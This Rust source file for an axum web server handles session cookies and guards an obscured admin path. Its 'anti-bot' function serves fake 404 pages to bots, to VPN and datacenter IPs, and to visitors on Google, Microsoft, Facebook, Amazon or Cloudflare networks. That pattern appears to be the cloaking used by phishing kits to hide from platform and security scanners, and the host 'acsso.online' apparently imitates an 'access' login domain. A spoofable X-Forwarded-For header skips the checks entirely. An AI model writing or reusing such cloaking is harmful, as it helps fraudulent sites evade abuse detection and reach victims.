use axum::http::{HeaderMap, StatusCode};
use axum_extra::extract::cookie::CookieJar;
use chrono::Utc;
use rand::Rng;
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;

use crate::engine::bot_detect;

pub type Sessions = Arc<RwLock<HashMap<String, chrono::DateTime<chrono::Utc>>>>;

pub fn new_sessions() -> Sessions {
    Arc::new(RwLock::new(HashMap::new()))
}

/// Gera ID de sessão aleatório
pub fn generate_session_id() -> String {
    let mut buf = [0u8; 32];
    rand::thread_rng().fill(&mut buf);
    hex::encode(buf)
}

/// Verifica se o request está autenticado
pub async fn is_authenticated(jar: &CookieJar, sessions: &Sessions) -> bool {
    if let Some(cookie) = jar.get("session") {
        let sessions = sessions.read().await;
        if let Some(expiry) = sessions.get(cookie.value()) {
            return Utc::now() < *expiry;
        }
    }
    false
}

/// Verifica se deve pular verificações anti-bot no admin
pub fn should_bypass_admin_checks(headers: &HeaderMap, host: &str, path: &str) -> bool {
    if !path.starts_with("/m4ciel7") {
        return false;
    }
    let host_lower = host.to_lowercase();
    if host_lower.contains("acsso.online") {
        return true;
    }
    if headers.contains_key("CF-Connecting-IP") || headers.contains_key("X-Forwarded-For") {
        return true;
    }
    false
}

/// Verifica proteção anti-bot para rotas admin
pub async fn admin_bot_check(
    state: &Arc<crate::AppState>,
    headers: &HeaderMap,
    client_ip: &str,
    user_agent: &str,
    host: &str,
    path: &str,
) -> Option<(StatusCode, String)> {
    if should_bypass_admin_checks(headers, host, path) {
        return None;
    }

    // Bloqueia bots
    if bot_detect::is_bot(user_agent) {
        return Some((StatusCode::NOT_FOUND, "404 page not found".into()));
    }

    // Bloqueia datacenter/VPN/Proxy
    let geo = state.geo_cache.get_geo_info(client_ip).await;
    if geo.hosting || geo.proxy {
        return Some((StatusCode::NOT_FOUND, "404 page not found".into()));
    }

    // Bloqueia ISPs suspeitas
    let suspicious_isps = ["facebook", "google", "microsoft", "amazon", "cloudflare"];
    let isp_lower = geo.isp.to_lowercase();
    for suspicious in &suspicious_isps {
        if isp_lower.contains(suspicious) {
            return Some((StatusCode::NOT_FOUND, "404 page not found".into()));
        }
    }

    None
}
